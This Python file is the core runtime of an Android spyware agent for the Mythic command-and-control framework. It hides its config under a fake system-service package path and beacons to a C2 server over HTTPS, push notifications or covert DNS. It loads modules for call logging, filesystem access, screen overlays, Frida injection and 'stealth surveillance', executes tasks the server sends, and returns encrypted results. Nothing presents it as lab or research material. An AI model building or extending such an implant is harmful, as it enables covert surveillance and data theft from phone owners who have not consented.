#!/usr/bin/env python3
"""
Core Android agent runtime for Mythic C2 framework
"""
import json
import os
import threading
import time
import uuid
from pathlib import Path

from utils.crypto import key_from_campaign_device, encrypt, decrypt
from utils.offline_logger import OfflineLogger

class MythicAgent:
    def __init__(self, config_path="/data/data/com.android.systemservice/config.json"):
        self.config = self._load_config(config_path)
        self.device_id = self.config.get("device_id", str(uuid.uuid4()))
        self.campaign = self.config["campaign_id"]
        self.encryption_key = key_from_campaign_device(
            self.campaign, 
            self.device_id, 
            self.config["encryption_algorithm"]
        )
        
        self.c2_profile = self._init_c2_profile()
        self.offline_logger = OfflineLogger(self.config, self.encryption_key)
        self.modules = {}
        self.running = True
        
    def _load_config(self, path):
        """Load agent configuration from embedded JSON"""
        try:
            with open(path, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return self._default_config()
    
    def _default_config(self):
        return {
            "campaign_id": "default_campaign",
            "device_id": str(uuid.uuid4()),
            "c2_profile": "https_beacon",
            "encryption_algorithm": "AES-256-GCM",  # Add this line
            "beacon_interval": 300,
            "offline_logging": True,
            "modules": ["call_logger", "filesystem", "stealth_surveillance"]
        }

    
    def _init_c2_profile(self):
        """Initialize selected C2 communication profile"""
        profile_name = self.config["c2_profile"]
        if profile_name == "https_beacon":
            from c2_profiles.https_beacon import HTTPSBeacon
            return HTTPSBeacon(self.config)
        elif profile_name == "fcm_push":
            from c2_profiles.fcm_push import FCMPush  
            return FCMPush(self.config)
        elif profile_name == "dns_covert":
            from c2_profiles.dns_covert import DNSCovert
            return DNSCovert(self.config)
        else:
            raise ValueError(f"Unknown C2 profile: {profile_name}")
    
    def load_modules(self):
        """Dynamically load enabled capability modules"""
        for module_name in self.config.get("modules", []):
            try:
                if module_name == "overlay":
                    from modules.overlay import OverlayModule
                    self.modules[module_name] = OverlayModule(self)
                elif module_name == "frida_loader":
                    from modules.frida_loader import FridaModule  
                    self.modules[module_name] = FridaModule(self)
                elif module_name == "call_logger":
                    from modules.call_logger import CallLoggerModule
                    self.modules[module_name] = CallLoggerModule(self)
                elif module_name == "filesystem":
                    from modules.filesystem import FilesystemModule
                    self.modules[module_name] = FilesystemModule(self)
                elif module_name == "stealth_surveillance":
                    from modules.stealth_surveillance import StealthSurveillanceModule
                    self.modules[module_name] = StealthSurveillanceModule(self)
                    
                print(f"[+] Loaded module: {module_name}")
            except Exception as e:
                print(f"[-] Failed to load module {module_name}: {e}")
    
    def beacon_loop(self):
        """Main C2 communication loop"""
        while self.running:
            try:
                # Check in with C2 server
                tasks = self.c2_profile.check_in(self.device_id)
                
                # Process received tasks
                for task in tasks:
                    self.handle_task(task)
                    
                time.sleep(self.config.get("beacon_interval", 300))
                
            except Exception as e:
                print(f"[!] C2 communication failed: {e}")
                # Enable offline logging on communication failure
                if self.config.get("offline_logging", True):
                    self.offline_logger.log_event("c2_failure", str(e))
                time.sleep(60)  # Retry after 1 minute
    
    def handle_task(self, task):
        """Handle individual task from C2"""
        try:
            module_name = task.get("module")
            command = task.get("command") 
            args = task.get("args", {})
            task_id = task.get("id")
            
            if module_name in self.modules:
                result = self.modules[module_name].execute(command, args)
                self.send_response(task_id, result)
            else:
                error = f"Module {module_name} not loaded"
                self.send_response(task_id, {"error": error})
                
        except Exception as e:
            self.send_response(task.get("id"), {"error": str(e)})
    
    def send_response(self, task_id, data):
        """Send task response back to C2"""
        try:
            encrypted_data = encrypt(json.dumps(data).encode(), self.encryption_key)
            self.c2_profile.post_response(task_id, encrypted_data)
        except Exception as e:
            print(f"[!] Failed to send response: {e}")
    
    def run(self):
        """Start the agent"""
        print(f"[+] Starting Mythic Android Agent")
        print(f"[+] Campaign: {self.campaign}")
        print(f"[+] Device ID: {self.device_id}")
        print(f"[+] C2 Profile: {self.config['c2_profile']}")
        
        self.load_modules()
        
        # Start beacon loop in separate thread
        beacon_thread = threading.Thread(target=self.beacon_loop, daemon=True)
        beacon_thread.start()
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("[!] Shutting down agent")
            self.running = False

if __name__ == "__main__":
    agent = MythicAgent()
    agent.run()
